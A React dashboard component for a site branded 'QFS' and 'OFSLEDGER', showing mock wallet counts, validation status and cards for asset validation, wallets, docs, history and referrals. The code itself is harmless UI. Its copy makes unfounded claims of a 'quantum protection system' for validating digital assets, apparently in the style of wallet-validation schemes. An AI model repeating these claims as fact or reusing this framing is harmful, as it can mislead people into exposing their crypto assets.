
import React from "react";
import { Link } from "react-router-dom";
import { ArrowRight, Clock, FileText, Shield, Users, Wallet } from "lucide-react";
import AnimatedSection from "@/components/ui/AnimatedSection";
import { Button } from "@/components/ui/button";
import Navbar from "@/components/layout/Navbar";
import Footer from "@/components/layout/Footer";

const Dashboard = () => {
  // Mock data - In a real app, this would come from your backend
  const user = {
    name: "John Doe",
    email: "john.doe@example.com",
    wallets: 2,
    validationStatus: "2 Pending",
  };

  const dashboardCards = [
    {
      icon: Shield,
      title: "Asset Validation",
      description: "Validate your digital assets securely with our quantum protection system.",
      link: "/validate",
      linkText: "Start Validation",
    },
    {
      icon: Wallet,
      title: "My Wallets",
      description: "View and manage all your connected wallets and their validation status.",
      link: "/wallets",
      linkText: "Manage Wallets",
    },
    {
      icon: FileText,
      title: "Documentation",
      description: "Learn more about QFS and how to properly validate your assets.",
      link: "/docs",
      linkText: "View Docs",
    },
    {
      icon: Clock,
      title: "Validation History",
      description: "Review the history of your asset validations and their status.",
      link: "/history",
      linkText: "View History",
    },
    {
      icon: Users,
      title: "Refer Users",
      description: "Help others secure their assets by referring them to OFSLEDGER.",
      link: "/refer",
      linkText: "Refer Now",
    },
  ];

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-grow pt-28 pb-20 bg-gradient-to-b from-custodia-surface/30 to-white">
        <div className="container-custom">
          <AnimatedSection>
            <div className="mb-8">
              <h1 className="text-3xl font-bold mb-2">Welcome, {user.name}</h1>
              <p className="text-gray-600">Here's a summary of your asset validation status</p>
            </div>
          </AnimatedSection>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mb-12">
            <AnimatedSection delay={1}>
              <div className="custodia-card">
                <div className="mb-4">
                  <Wallet className="h-8 w-8 text-custodia" />
                </div>
                <h3 className="text-xl font-semibold mb-1">Connected Wallets</h3>
                <p className="text-3xl font-bold text-custodia">{user.wallets}</p>
                <Link to="/wallets" className="text-sm text-custodia hover:underline mt-2 inline-block">
                  Manage wallets
                </Link>
              </div>
            </AnimatedSection>

            <AnimatedSection delay={2}>
              <div className="custodia-card">
                <div className="mb-4">
                  <Shield className="h-8 w-8 text-custodia" />
                </div>
                <h3 className="text-xl font-semibold mb-1">Validation Status</h3>
                <p className="text-3xl font-bold text-custodia">{user.validationStatus}</p>
                <Link to="/validate" className="text-sm text-custodia hover:underline mt-2 inline-block">
                  Continue validation
                </Link>
              </div>
            </AnimatedSection>

            <AnimatedSection delay={3}>
              <div className="custodia-card bg-custodia text-white">
                <div className="mb-4">
                  <ArrowRight className="h-8 w-8" />
                </div>
                <h3 className="text-xl font-semibold mb-1">Quick Actions</h3>
                <Button
                  asChild
                  variant="outline"
                  className="mt-2 bg-white text-custodia hover:bg-gray-100"
                >
                  <Link to="/validate">Start New Validation</Link>
                </Button>
              </div>
            </AnimatedSection>
          </div>

          <AnimatedSection>
            <h2 className="text-2xl font-bold mb-6">What would you like to do?</h2>
          </AnimatedSection>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {dashboardCards.map((card, index) => (
              <AnimatedSection key={card.title} delay={(index % 3 + 1) as 1 | 2 | 3 | 4}>
                <div className="custodia-card h-full flex flex-col">
                  <div className="bg-custodia/10 p-3 rounded-full w-12 h-12 flex items-center justify-center mb-4">
                    <card.icon className="h-6 w-6 text-custodia" />
                  </div>
                  <h3 className="text-xl font-semibold mb-3">{card.title}</h3>
                  <p className="text-gray-600 mb-4 flex-grow">{card.description}</p>
                  <Button
                    asChild
                    variant="outline"
                    className="text-custodia border-custodia hover:bg-custodia hover:text-white mt-auto w-full"
                  >
                    <Link to={card.link}>
                      {card.linkText}
                      <ArrowRight className="ml-2 h-4 w-4" />
                    </Link>
                  </Button>
                </div>
              </AnimatedSection>
            ))}
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Dashboard;
